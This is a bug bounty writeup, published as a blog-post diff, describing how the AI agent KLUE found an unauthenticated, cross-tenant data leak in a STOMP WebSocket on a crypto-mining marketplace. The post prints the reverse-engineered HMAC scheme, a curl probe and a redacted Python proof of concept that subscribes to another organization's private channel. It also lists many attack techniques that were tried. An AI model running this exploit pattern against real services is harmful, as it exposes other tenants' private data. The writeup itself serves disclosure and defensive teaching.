@@ -1,0 +1,313 @@
+---
+title: 'KLUE vs. a Hardened Target: One Bug, No Signature Required'
+summary: 'A detailed bug bounty writeup. Our autonomous agent KLUE spent hours proving a hardened crypto-mining marketplace was hardened, then reverse-engineered its HMAC signing scheme, mapped a STOMP WebSocket buried in the authenticated app bundles, and discovered it performed no authentication at all, routing private per-tenant channels off a client-supplied parameter. An unauthenticated, cross-tenant data leak, responsibly disclosed and rewarded.'
+date: '2026-07-17'
+lastmod: '2026-07-17'
+authors: ['appsec-research']
+tags:
+  [
+    'klue',
+    'case-study',
+    'bug-bounty',
+    'ai-pentesting',
+    'websocket-security',
+    'broken-authentication',
+    'stomp',
+    'bola',
+    'idor',
+    'autonomous-security',
+    'appsec',
+    'pentesting',
+  ]
+draft: false
+layout: PostSimple
+canonicalUrl: 'https://shellvoide.com/blog/websocket-auth-bypass-bug-bounty-case-study'
+---
+
+> [!NOTE]
+> KLUE is Shellvoide's AI Security Engineer for Compliance, Continuous Pentesting, Vulnerability Assessment and Secure CI/CD pipelines. This is a writeup from a live, public bug bounty engagement against the staging estate of a large cryptocurrency mining marketplace. The target is not named, and every host, identifier, wallet address, and rig ID below is redacted or genericized. The vulnerability was responsibly disclosed, fixed, and rewarded. The reasoning excerpts are from the run log; the proof-of-concept is a faithful reconstruction with target-identifying values removed.
+
+Most bug bounty writeups are about the payload. This one is mostly about the three hours of reconnaissance and reverse-engineering it took to earn a payload that was ultimately one line long. It is also about a target that did almost everything right, except in one place nobody thought to look.
+
+We put KLUE on a public program covering a well-known mining marketplace's staging environment: a single-page web app and the REST API behind it, both scoped Critical. What follows is the full hunt, because the difficulty of this finding is the entire point. The bug itself is simple to state. Getting to a position where you could even *see* it required rebuilding the platform's authentication scheme from minified JavaScript, defeating nothing and giving up on a dozen dead ends, and understanding a piece of framework-internal routing that no scanner has a rule for.
+
+## Recon: an API you have to reconstruct
+
+The first wall was that there was nothing to crawl. The API root returned `404`. It was entirely path-driven, with no index, no directory listing, and a REST surface that only responded to exact routes. The web app was a modern Vite-built SPA, which meant the routes and endpoints did not exist in any HTML KLUE could fetch. They were assembled at runtime inside JavaScript.
+
+So the map had to come out of the bundles. KLUE pulled the SPA's JS and went looking for the API inventory, and immediately hit the second wall: the endpoint paths were not string literals. They were built from fragments and template literals, 38 references to one API prefix and 17 to another, all concatenated at call time rather than written out. A naive `grep` for endpoint paths returns almost nothing on a codebase like this. You have to recover the surrounding context and reconstruct the paths from their pieces.
+
+That work paid off with the thing that turned the engagement from guesswork into a survey. The SPA referenced **six OpenAPI/Swagger specifications**, the machine-readable inventory of every endpoint, parameter, and auth requirement across the platform's services.
+
+<ReasoningTrace
+  label="klue · recovering the endpoint inventory"
+  lines={[
+    { time: '14:43', role: 'STATE', text: `Mapping the API surface from the SPA bundles` },
+    { time: '14:43', role: 'AGENT', text: `Endpoint paths are embedded in template literals, not literals: 38 api/v2 and 17 main/api references, all concatenated. Extracting surrounding context to recover the actual paths.` },
+    { time: '14:44', role: 'AGENT', text: `The SPA references six OpenAPI specs (the main one is ~120KB, another ~159KB, so these are large APIs). Those specs are the master inventory of every endpoint and parameter. Pulling all of them now.` },
+  ]}
+/>
+
+Parsed out, that came to **147 endpoints** across multiple services, and it flagged exactly the surface a bounty hunter dreams about: a family of financial `autoWithdraw/{id}` endpoints (auto-withdrawal configuration, which controls where crypto goes), order-mutation endpoints taking object IDs in the path (IDOR/BOLA candidates), an `admin/` namespace, and a risk-management endpoint touching law-enforcement data. On paper, this looked like a target about to fall over.
+
+It did not fall over. Almost everything sensitive in that inventory sat behind authentication, and getting authenticated turned out to be the whole problem.
+
+## The auth model, rebuilt from minified JS
+
+To test any of the authenticated surface (the IDOR candidates, the financial config, the object-level authorization) KLUE first had to be able to make a valid authenticated request. That meant understanding how the SPA signs its API calls, and the platform used a custom HMAC scheme that had to be reverse-engineered from the minified request-signing function.
+
+The scheme, recovered from the bundle, works like this. Every authenticated request carries an `X-Auth` header of the form:
+
+```text
+X-Auth = sessionKey + ":" + HMAC_SHA256(secret, message)
+
+message = sessionKey \0 time \0 nonce \0\0 orgId \0\0 METHOD \0 path \0 query [\0 body]
+```
+
+with the pieces coming from three places:
+
+- `sessionKey`: the login session ID, held in a cookie.
+- `secret`: a per-session `userToken`, held in localStorage. This is the HMAC key.
+- `orgId`: the organization ID, sent in an `X-Organization-Id` header and folded into the signed message.
+
+Plus `X-Time` (server time in ms), `X-Nonce` and `X-Request-Id` (UUIDs), with null bytes (`\0`) separating each field of the signed string. KLUE rebuilt this exactly in Python, signed a request, and confirmed the scheme was correct: unsigned requests returned an "invalid session" error, while its correctly-signed requests changed the error class, showing the signature was being parsed and accepted as well-formed.
+
+Crucially, this same HMAC scheme was enforced **everywhere**. REST rejected a bad signature with a clean `401`. The legacy API version did the same. This consistency matters enormously later, so hold onto it.
+
+## The 2FA wall that sealed the good stuff
+
+Reverse-engineering the signature let KLUE *speak* the protocol. It still could not get a live session, because of a genuinely well-built control.
+
+Logging in with the provided test account, through a stealth browser to clear the reCAPTCHA, progressed the flow to a **new-device email verification** step. The account had no TOTP or app-based 2FA configured. The single second factor was an emailed code, and we had no inbox access. Two things about that code closed off the obvious attacks:
+
+- It was **high-entropy**, a 24-character code in four groups (`XXXXXX-XXXXXX-XXXXXX-XXXXXX`), so brute force was hopeless.
+- A `userToken` and a pending `loginSessionID` were written to localStorage **before** the code was entered, which looked promising: if that pre-verification session already authorized API calls, email verification would be bypassable.
+
+KLUE chased that pre-verification-session lead hard, and it held up as correct behavior:
+
+<ReasoningTrace
+  label="klue · the 2FA wall (a non-bug, correctly parked)"
+  lines={[
+    { time: '15:00', role: 'AGENT', text: `The pending TWO_FACTOR_REQUIRED session, signed correctly, grants access to zero authenticated endpoints, identical 401 to a deliberately wrong-secret control. The API enforces 2FA completion. This is correct security behavior, not a bypass.` },
+    { time: '15:01', role: 'AGENT', text: `The emailed code is high-entropy and not brute-forceable, the verify endpoint is rate-limited, and empty/null/NoSQL payloads in the code field all throw without ever flipping the session to ACTIVE. No logic bypass. Parking the authenticated surface. It is genuinely sealed.` },
+  ]}
+/>
+
+That is the strategic hinge of the whole engagement. The valuable surface, every IDOR and BOLA candidate in those 147 endpoints, was behind a wall we could not climb with the account we had. To find *anything*, KLUE had to find a surface that was both sensitive **and** reachable without a completed session. That constraint is what eventually pointed it at the WebSocket. But first it exhausted everything else.
+
+## Everything else came back negative
+
+We want to be exact about how defended this target was, because it is inseparable from the value of what was eventually found. Over the run, KLUE drove the full battery against both in-scope hosts, and every attempt came back clean:
+
+| What we threw at it | What came back |
+| --- | --- |
+| Injection across every public parameter (SQLi, NoSQLi, SSRF, SSTI, XXE, command) | Strongly typed or safely parameterized, no reachable sink |
+| Gateway authorization (path confusion, `..;/` traversal, verb tampering, method override, internal-IP header spoofing) | Robust. Every trick normalized back to the canonical auth-gated route |
+| Auth flow (mass-assignment to skip 2FA, pre-verification session reuse, NoSQL in the verify field, `otp/resend` code leak) | Second factor correctly enforced. No logic bypass, no code disclosure |
+| Social login (forged Google / Apple ID tokens: `alg:none`, garbage RS256 signatures) | Server-side token verification held. Forged tokens granted no session and the email claim was never trusted |
+| Anti-automation (captcha replay, client-fingerprint forgery, `captchaSiteId` nulling) | Replayable fingerprint, but server-validated and email/device-bound, rate-limited, below the bar |
+| Protocol layer (request smuggling, TE/CL desync, duplicate `Content-Length`, cache poisoning, prototype pollution, content-type confusion) | Front-end load balancer rejected or normalized every variant |
+| CORS and CSP | Strict origin allow-list. A fresh per-request nonce with no reuse |
+| Business logic (numeric abuse on pricing/preview, payment-request IDOR, coupon flows) | Object IDs random and non-enumerable. Public views carried no PII |
+
+Every one came back negative. For the better part of three hours, the honest status of the run was simple: nothing worth filing. That is the part most writeups skip, and it is the part that makes the eventual finding trustworthy.
+
+## The false positive KLUE talked itself out of
+
+Before the WebSocket, there was one moment that looked like a critical and wasn't. It is worth telling, because refuting it is what kept the final report clean.
+
+Deep in the authenticated app bundles, KLUE found organization-scoped endpoints that behaved oddly. Hitting one unauthenticated returned the usual `401 Invalid session`. But adding a single client-supplied `X-User-Id` header flipped the response to a *different* error: `400 Organization mismatch`. On its face that reads as a smoking gun: the session check appears to drop when the header is present, leaving only an org-ownership check between an attacker and the data.
+
+A tool optimizing for finding count files that as a High. KLUE ran the disambiguating test instead:
+
+<ReasoningTrace
+  label="klue · refuting its own lead"
+  lines={[
+    { time: '16:14', role: 'AGENT', text: `Definitive test: the endpoint returns "Organization mismatch" for every unauthenticated request, with the header, without it, or with an empty value. A garbage X-User-Id returns "Invalid UUID", so it is format-validated but not trusted for authentication.` },
+    { time: '16:15', role: 'AGENT', text: `So X-User-Id is NOT an auth bypass. These endpoints just return an org-level error instead of a session-level error for unauthenticated callers, a cosmetic inconsistency, not a vulnerability. Good that I verified before reporting; this would have been a false positive.` },
+  ]}
+/>
+
+Every appsec engineer has received the report where "different error message" was inflated into "authentication bypass." KLUE refuted its own version in writing before it reached anyone.
+
+## The surface nobody else authenticated the same way
+
+Now the pivot. Recall the one consistent fact about this platform: every sensitive component spoke the same authentication language, the HMAC signature, and enforced it. REST, the legacy API, the social callbacks. One scheme, applied everywhere.
+
+Except there was a component that spoke a different protocol entirely: the realtime **WebSocket** backend that streams live updates to the app. It used **STOMP over WebSocket**, and finding it at all took another round of bundle spelunking, because the authenticated application shipped its own separate bundle set, under a distinct `/my/assets/` path loaded only after login, that was invisible until KLUE went looking specifically for the post-login code.
+
+Inside those bundles were two WebSocket endpoints:
+
+- a **public** socket (`/ws-front-public/websocket`) that carried only broadcast data: public marketplace tickers and lottery-style events; and
+- an **authenticated** socket (`/ws-front/websocket/`) that carried the private, per-tenant channels: a user's own orders, balances, and the live status of their rig-management actions. Its connection was supposed to be signed with the *same* HMAC scheme as REST.
+
+The private channels were the target: reachable, in theory, without touching the 2FA-walled REST endpoints, *if* the socket's authentication had a flaw. To test that, KLUE first reverse-engineered the WebSocket's own signing function out of the minified code (a sibling of the REST signer, computing the same HMAC over the session key, time, nonce, and a client-supplied org value). Then it went to check whether the socket actually validated that signature.
+
+It didn't. Not a little. Not at all.
+
+<ReasoningTrace
+  label="klue · the socket that didn't check"
+  lines={[
+    { time: '16:34', role: 'STATE', text: `Testing whether the authenticated WebSocket validates its connection signature` },
+    { time: '16:35', role: 'AGENT', text: `A pre-2FA pending session is accepted and returns CONNECTED, where every REST endpoint rejected the same session. Pulling harder.` },
+    { time: '16:35', role: 'AGENT', text: `A garbage signature returns CONNECTED. A completely absent signature, with no time, no nonce, no auth header, no token, ALSO returns CONNECTED. The socket performs no signature or session validation whatsoever.` },
+    { time: '16:35', role: 'AGENT', text: `Worse: the STOMP principal that routes private per-user channels is set verbatim from a client-supplied URL parameter, o. Send o=victim-org-1234 and the CONNECTED frame returns user-name:victim-org-1234. The tenant identity for private-channel routing is attacker-chosen.` },
+  ]}
+/>
+
+## Root cause: a principal you get to declare
+
+Two facts, and their product is the bug.
+
+**Fact one: the socket authenticates nobody.** A CONNECT frame with a forged signature, or with no signature at all, is accepted and upgraded to a live STOMP session.
+
+**Fact two: the routing identity is client-controlled.** The framework behind this API uses the well-known Spring pattern of routing private messages to per-user destinations, the STOMP `/user/**` convention, where the broker delivers a `/user/<something>` message only to the connection whose *principal* matches. On this socket, that principal was taken directly from the `o` URL parameter and echoed straight back in the `CONNECTED` frame's `user-name`. Whatever you put in `o` becomes who the broker thinks you are.
+
+Put them together and the recipe for reading another organization's private realtime stream is:
+
+1. Open an unauthenticated WebSocket to the authenticated endpoint, with `o` set to the victim's `organizationId`.
+2. Receive `CONNECTED`, with no credential required and `user-name` now equal to the victim's org.
+3. `SUBSCRIBE` to the private `/user/**` destination. The broker routes that organization's private messages to you.
+
+The only thing an attacker needs that they might not already have is the victim's `organizationId`, and that is not a secret. It is shared with every member of an organization, it rides along in client URLs and REST traffic, and (as KLUE later confirmed) it appears as an example value in the platform's own public API documentation. It is a routing key, not a password.
+
+And here is the line that makes the whole thing land. The same garbage signature that opens the socket is *rejected* by REST, proving one subsystem simply forgot the check every other subsystem makes:
+
+```bash
+# Identical bogus HMAC. REST validates it; the WebSocket never looks.
+curl -s -o /dev/null -w "%{http_code}\n" \
+  https://<redacted-staging-api>/main/api/v2/accounting/accounts2 \
+  -H "X-Time: 1" -H "X-Nonce: x" \
+  -H "X-Organization-Id: 00000000-0000-0000-0000-000000000000" \
+  -H "X-Request-Id: x" \
+  -H "X-Auth: 00000000-0000-0000-0000-000000000000:deadbeef"
+# -> 401
+```
+
+That is almost always how a bug survives in an otherwise sound system: not a team that misunderstands authentication, but one component wired up through a different code path that never inherited the rule the rest of the codebase follows.
+
+## Proving it end to end (this was the hard part)
+
+A `CONNECTED` frame and an echoed principal are strong signals, but they are not proof. Proof is *a victim's private bytes arriving on an attacker's credential-less socket, and a control connection getting nothing.* Assembling that deterministically was fiddly, for a few reasons:
+
+- The private `/user/**` channels are **event-driven with no snapshot-on-subscribe**. They push nothing until the target organization actually does something. Subscribing and waiting on a quiet staging environment produced silence, which is easy to mistake for "the attack failed" when it really means "no event fired."
+- To distinguish "the socket won't deliver cross-tenant" from "nothing happened," KLUE needed a **controlled event** on the victim side and a **control connection** declaring a *different* org, captured in the same window.
+
+So the PoC is a three-connection choreography: an unauthenticated attacker socket declaring the victim's org, an unauthenticated control socket declaring an unrelated org, and one genuine event generated from the victim's own (separately authenticated) identity, which in a real attack is simply the victim using their own app normally. Redacted:
+
+```python
+import ssl, time, json, hmac, hashlib, uuid, urllib.parse, threading
+from websocket import create_connection, WebSocketTimeoutException
+
+WS  = "wss://<redacted-staging-host>/ws-front/websocket/"; NUL = "\x00"
+SUB = "/user/<redacted-private-user-scoped-destination>"   # a private per-tenant channel
+
+# victim values: used ONLY to emit one real event. The attacker uses none of them.
+V_SESSION = "<victim loginSessionID>"
+V_SECRET  = "<victim userToken>"
+V_ORG     = "<victim organizationId>"                       # NOT a secret
+V_RIG     = "<victim rig id>"
+CONTROL_ORG = "11111111-2222-3333-4444-555555555555"       # a different org (control)
+REQ = "poc-" + str(int(time.time() * 1000))
+
+def stomp(params):
+    ws = create_connection(WS + "?" + urllib.parse.urlencode(params),
+                           sslopt={"cert_reqs": ssl.CERT_NONE},
+                           header=["Origin: https://<redacted-staging-web>"], timeout=8)
+    ws.send("CONNECT\naccept-version:1.2\nheart-beat:10000,10000\n\n" + NUL); time.sleep(0.4)
+    return ws, ws.recv()
+
+def collect(ws, bucket, secs):
+    ws.settimeout(1.5); end = time.time() + secs
+    while time.time() < end:
+        try: m = ws.recv()
+        except WebSocketTimeoutException: continue
+        except Exception: break
+        if m and m.startswith("MESSAGE"): bucket.append(m.split(NUL)[0].split("\n\n", 1)[-1])
+
+# 1) ATTACKER: fully unauthenticated. Only o=<victim org>. No signature, no token.
+atk, hello = stomp({"o": V_ORG})
+print("[attacker] unauth connect ->", hello.split(chr(10))[0],
+      "| user-name:", hello.split("user-name:")[1].split("\n")[0])
+atk.send(f"SUBSCRIBE\nid:s\ndestination:{SUB}\n\n" + NUL)
+
+# control: a DIFFERENT org. Should receive nothing.
+ctl, _ = stomp({"o": CONTROL_ORG}); ctl.send(f"SUBSCRIBE\nid:s\ndestination:{SUB}\n\n" + NUL)
+
+time.sleep(0.6); a, c = [], []
+threading.Thread(target=collect, args=(atk, a, 12), daemon=True).start()
+threading.Thread(target=collect, args=(ctl, c, 12), daemon=True).start()
+time.sleep(0.5)
+
+# 2) VICTIM: their own authenticated app performs one normal rig-management action.
+t = str(int(time.time() * 1000)); n = str(uuid.uuid4())
+a_sig = V_SESSION + ":" + hmac.new(V_SECRET.encode(),
+        f"{V_SESSION}\x00{t}\x00{n}\x00\x00{V_ORG}\x00\x00wss\x00my\x00".encode(),
+        hashlib.sha256).hexdigest()
+vic, _ = stomp({"t": t, "n": n, "a": a_sig, "o": V_ORG})
+body = json.dumps({"affectedDevicesGroups": [{"rigIds": [V_RIG]}],
+                   "bundle": {"resetBundle": True}, "requestId": REQ})
+vic.send(f"SEND\ndestination:/ws/<redacted-action>\ncontent-type:application/json\n"
+         f"content-length:{len(body)}\n\n{body}" + NUL)
+
+time.sleep(13)
+print(f"attacker (unauth, victim org) got victim's reply : {any(REQ in m for m in a)}")
+print(f"control  (different org)       got victim's reply : {any(REQ in m for m in c)}")
+```
+
+The live output, redacted:
+
+```text
+[attacker] unauth connect -> CONNECTED | user-name: <attacker-chosen o>
+[victim]   authenticated rig action sent (requestId=poc-...)
+
+[attacker] CAPTURED (cross-tenant):
+  {"successType":"IN_PROGRESS","message":"Update started","recordsToProcess":1,...,"requestId":"poc-..."}
+  {"successType":"NOT_SUCCESSFUL","message":" (1004): Rig not found: [REDACTED payout address] [REDACTED rig id]", "recordsToProcess":1,...,"requestId":"poc-..."}
+
+attacker (unauth, victim org) got victim's reply : True
+control  (different org)       got victim's reply : False
+```
+
+The unauthenticated socket, with no signature and `user-name` echoing the attacker's chosen value, received the victim organization's private reply. The control socket, identical except that it declared a *different* org, received nothing. Delivery was keyed solely on the attacker-supplied `o`.
+
+To kill the last alternative explanation, that the credential-less connection was a dead handshake rather than a live session, KLUE ran a parallel comparison against a public broadcast channel. The unauthenticated spoofed-principal socket received the exact same live message stream, message-for-message, as a fully legitimate connection. The socket was live, and the only thing standing between it and any organization's private data was a value the attacker gets to type.
+
+## What the leak actually exposes
+
+This is the part we refuse to inflate, because inflating it is how you lose a triager on the next submission.
+
+The captured messages disclose real, cross-tenant information: the victim organization's crypto **payout address** (server-injected into the status reply, which in production links the organization to an on-chain wallet), their **rig identifiers**, the **device count** involved in an action, and the **timing and outcome** of their mining operations. That is a genuine confidentiality breach across a tenant boundary, reachable by anyone on the internet who knows a non-secret ID, with no interaction from the victim beyond normal app usage.
+
+We scoped it precisely rather than dressing it up. It does **not** expose account balances, order books, personal information, or credentials, and the *write* side of the channel appeared to be authorized separately: KLUE probed the publish path with a deliberately empty, non-state-changing payload, got no response, and marked the integrity/rig-control angle **unconfirmed** rather than claiming a rig-hijack it hadn't proven. What stands is the part that matters, and it is not a small one: an unauthenticated, cross-tenant leak of real operational data on a platform that had closed every other door we tried.
+
+One boundary we always name: because the flaw is in *how the routing principal is derived*, **any** message the backend sends to a `/user/**` destination keyed on the organization ID is exposed by the same mechanism. The rig-action channel is the one demonstrated end to end. It is representative, not exhaustive.
+
+## Why this was hard to find
+
+It is worth being explicit about the difficulty, because the finished bug looks deceptively small: "the WebSocket doesn't check auth." Reaching the point where you could observe that took a stack of non-obvious steps, each of which gates the next:
+
+1. **The API had to be reconstructed, not crawled.** No index, path-driven routing, and endpoints assembled from template-literal fragments in a Vite bundle. The inventory only existed because KLUE recovered six OpenAPI specs the SPA referenced indirectly.
+2. **The signing scheme had to be reverse-engineered from minified JS.** The exact HMAC construction, field order, and null-byte framing, just to make a single well-formed authenticated request. Without that, you cannot even tell a rejected-signature response from a malformed-request one.
+3. **The obvious path was walled.** The entire high-value authenticated surface sat behind new-device email 2FA that could not be brute-forced, bypassed, or leaked. That forced the search toward surfaces reachable *without* a completed session, a much narrower and less obvious set.
+4. **The vulnerable component was buried.** The WebSocket auth logic lived in a separate authenticated-app bundle set under a distinct path, loaded only post-login, and there were two sockets: a decoy public one carrying only broadcast data, and the authenticated one where the private channels lived.
+5. **The bug is a framework-internals insight, not a payload.** Recognizing that `/user/**` STOMP routing keyed on a client-controlled principal equals cross-tenant delivery requires knowing how Spring's user-destination routing works. There is no fuzzer input for it.
+6. **Confirming impact was a timing puzzle.** Event-driven channels with no snapshot meant a passive subscribe looked identical to failure. Proving it demanded a controlled victim event plus a same-window control connection to show delivery was keyed on `o` and nothing else.
+
+Any one of those steps is where a scan stops and where a human, three hours into a target that has rejected everything, reasonably concludes it's solid and writes "no significant findings."
+
+## Why a scanner doesn't get here, and why a human might not
+
+A DAST scanner crawls HTTP. It does not open a STOMP-over-WebSocket connection, forge a CONNECT frame with no signature, notice that the `CONNECTED` frame's `user-name` echoes a client parameter, and reason that Spring's `/user/**` routing on a client-controlled principal means cross-tenant delivery. There is no payload in any library for "this socket authenticates by believing you."
+
+The more honest comparison is with a human, who *could* absolutely find this. The question is whether they *would*, three hours deep into a target that had normalized every smuggling attempt, sealed every financial endpoint behind 2FA, and validated its HMAC on every REST route including the legacy one. That is the point where human attention, entirely reasonably, concludes the target is hardened and moves on. KLUE doesn't get bored, doesn't get discouraged by a wall of negatives, and doesn't lose the single thread that says *one component here speaks a different protocol than all the others, so go verify it enforces the same rule.* Holding a complete theory of the application in mind for three hours and catching the one inconsistency is the expensive, unscalable part, and it is the part the machine did.
+
+The honest shape of it: KLUE found the flaw, reverse-engineered the signing scheme, confirmed the broken authentication, and built the cross-tenant proof. A human on our side reviewed the finding, checked the line between what was observed and what was inferred, and made the severity call before it shipped. The machine did the reading, and a person closed the loop.
+
+## Disclosure
+
+The finding was submitted with the full PoC, a browser screenshot, and an explicit statement of the verification boundary, including what was directly captured versus architecturally inferred, and the publish/integrity side marked unconfirmed rather than claimed. It was triaged, accepted, remediated, and rewarded. One finding, on a target that had done almost everything right, and the three hours of nothing that preceded it are the reason the one page that mattered was believed the moment it was read.
+
+---
+
+_Want a run like this against your own application? Book an engagement at [shellvoide.com/book](https://shellvoide.com/book), or reach us at [info@shellvoide.com](mailto:info@shellvoide.com)._
